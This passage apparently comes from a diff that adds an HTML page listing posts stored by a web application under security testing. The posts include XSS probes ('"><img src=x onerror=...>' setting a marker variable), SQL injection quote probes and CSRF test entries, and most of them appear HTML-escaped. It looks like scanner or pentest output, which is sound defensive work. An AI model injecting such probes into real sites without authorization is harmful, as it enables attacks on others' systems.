+                                &lt;td&gt;&lt;h3&gt;xss-probe2&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=&amp;quot;window.__verdict_xss=\'stoXmqz5pnlnesg7\'&amp;quot;&amp;gt;&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdictstoXmqz5pw4hjk7lsafe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;titlexsstest&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=&amp;quot;window.__verdict_xss=\'stoXmqz5pw4hjk7l\'&amp;quot;&amp;gt;&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;titlexsstest&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;csrf-test&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;csrf-test&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;csrf-test&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;csrf-test&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;sqltest\'&amp;quot;&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;sqltestbody&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;xsstitle&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdictstoXmqz5wu4ogxiusafe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;xsstitle&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=&amp;quot;window.__verdict_xss=\'stoXmqz5wu4ogxiu\'&amp;quot;&amp;gt;&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdictstoXmqz5xl18ahhgsafe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;xssbody&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=&amp;quot;window.__verdict_xss=\'stoXmqz5xl18ahhg\'&amp;quot;&amp;gt;&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;xssbody&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdictsqli\'&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-sx&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdictstoXmqz60yqs3hdzsafe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-sx&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=&amp;quot;window.__verdict_xss=\'stoXmqz60yqs3hdz\'&amp;quot;&amp;gt;&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdictstoXmqz62ee74q67safe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-title-sink&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=&amp;quot;window.__verdict_xss=\'stoXmqz62ee74q67\'&amp;quot;&amp;gt;&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-title-sink&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;csrf-test&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;csrf-test-body&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;csrf-test&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;csrf-test-body&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdictSQLbase&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;sqlbaseline&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdictSQL\'&amp;quot;`--&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;sqlquote&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;</pre></div>
+</div>
+</body></html>
